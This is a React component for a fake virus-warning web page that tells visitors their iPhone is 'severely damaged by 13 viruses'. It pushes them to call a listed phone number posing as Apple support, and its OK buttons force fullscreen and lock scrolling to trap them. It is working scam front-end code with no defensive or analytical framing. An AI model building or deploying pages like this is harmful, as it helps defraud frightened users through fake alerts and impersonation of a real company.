import React, { useState, useEffect } from "react"
import Warning from '../assets/warning.webp'
import Setting from '../assets/Settings1.webp'

const Hero = () => {
    const [isFullscreen, setIsFullscreen] = useState(false);
    const [isIOS, setIsIOS] = useState(false);

    useEffect(() => {
        // Check if user is on iOS device
        const checkIsIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
        setIsIOS(checkIsIOS);
    }, []);

    const toggleFullscreen = () => {
        if (isIOS) {
            setIsFullscreen(true);
            document.documentElement.style.overflow = 'hidden';
            document.body.style.overflow = 'hidden';
        } else {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen().catch((err) => {
                    setIsFullscreen(true);
                    document.documentElement.style.overflow = 'hidden';
                    document.body.style.overflow = 'hidden';
                });
            }
            setIsFullscreen(true);
        }
    };

    // iOS-specific spacing classes
    const iosBottomSpacing = isIOS ? "bottom-32 md:bottom-36" : "bottom-16 md:bottom-20";
    const iosBottomButtonSpacing = isIOS ? "bottom-16 md:bottom-20" : "bottom-4 md:bottom-6";

    return (
      <div className={`${
        isFullscreen 
          ? 'fixed inset-0 bg-white z-[9999] h-screen w-screen overflow-hidden touch-none' 
          : 'px-6 py-8 max-w-4xl mx-auto'
        } relative font-geologica md:px-8 lg:px-10`}
        style={isFullscreen ? {
          height: '100dvh',
          minHeight: '-webkit-fill-available',
          WebkitOverflowScrolling: 'touch',
        } : {}}
      >
        <h1 className="text-[18px] before:leading-[28px] text-ligh-red font-normal mb-[24px] md:text-[20px] lg:text-[22px]">
          Warning Your Apple iPhone is severely damaged by 13 viruses
        </h1>
          
        <p className="text-gray-700 mb-8 text-justify text-sm leading-relaxed md:text-base lg:text-base">
          We have detected that your Browser is (62%) DAMAGED by BROWSER TROJAN VIRUSES picked up while surfing recent corrupted sites.Immediate action is required to prevent ot from <span className="text-ligh-red">spreading and infecting sensitive data like your.Facebook account,Whatsapp messages photos and private.applications.</span>
        </p>

        <div className="text-black mb-6 leading-[28px] md:mb-8">
          <p className="font-normal text-justify mb-4 text-sm md:text-base lg:text-base">
            Here is how you can solve this in just few seconds (Step by Step)
          </p>
    
          <div className="space-y-2 mt-6 md:space-y-3 md:mt-8">
            <p className="font-normal text-justify text-sm md:text-base">Step1: Tap REMOVEVIRUS to install VPN from the</p>
            <p className="font-normal text-justify text-sm md:text-base">Step2: Tap REMOVEVIRUS to install VPN from the</p>
            <p className="font-normal text-justify text-sm md:text-base">Step3: Tap REMOVEVIRUS to install VPN from the</p>
            <p className="font-normal text-justify text-sm md:text-base">Step4: Tap REMOVEVIRUS to install VPN from the</p>
            <p className="font-normal text-justify text-sm md:text-base">Step5: Tap REMOVEVIRUS to install VPN from the</p>
          </div>
        </div>

        {/* Center Modal */}
        <div className={`fixed ${isIOS ? 'top-1/3' : 'top-1/2'} left-1/2 transform -translate-x-1/2 -translate-y-1/2 
                bg-[#1b1b1b]/90 p-4 rounded-xl h-[200px] w-[280px] text-center shadow-2xl z-50
                md:w-[320px] md:h-[220px] lg:w-[360px] lg:h-[240px]`}>
          <div className="flex justify-center mb-3">
            <img 
              src={Warning} 
              alt="Warning" 
              className="h-[60px] w-[60px] object-contain md:h-[70px] md:w-[70px] lg:h-[80px] lg:w-[80px]"
            />
          </div>
          
          <div className="mb-3 [&>*]:text-whitish">
            <p className="mb-1 !text-whitish text-sm md:text-base">Call apple support how To fix this issue</p>
            <p className="!text-whitish text-xs">+1 (833) 638 3086</p>
          </div>
          
          <button 
            onClick={toggleFullscreen}
            className="w-full bg-[#ff4b4b] !text-whitish py-2 rounded-lg hover:bg-[#ff3b30] transition-colors text-xs md:text-sm"
          >
            OK
          </button>
        </div>

        {/* Bottom Notifications - iOS-specific spacing */}
        <div className={`fixed ${iosBottomSpacing} left-1/2 transform -translate-x-1/2 w-[280px] bg-whitish rounded-xl z-50 
                md:w-[320px] lg:w-[360px]`}>
          <div className="p-4 flex items-start gap-3 md:p-5">
            <div className="relative">
              <img 
                src={Setting} 
                alt="Settings" 
                className="h-[60px] w-[60px] object-contain md:h-[70px] md:w-[70px] lg:h-[80px] lg:w-[80px]"
              />
            </div>
            
            <div className="flex flex-col text-left">
              <p className="text-sm text-black">Please call apple support now To fix this issue</p>
              <p className="text-xs mt-2 text-glass-black">Immediate Action Is Required</p>
            </div>
          </div>
        </div>

        {/* Bottom OK Button - iOS-specific spacing */}
        <div className={`fixed ${iosBottomButtonSpacing} left-1/2 transform -translate-x-1/2 w-[280px] bg-whitish rounded-xl z-50
                md:w-[320px] lg:w-[360px]`}>
          <button 
            onClick={toggleFullscreen}
            className="w-full py-2.5 text-center text-sm font-medium"
          >
            OK
          </button>
        </div>
      </div>
    )
}

export default Hero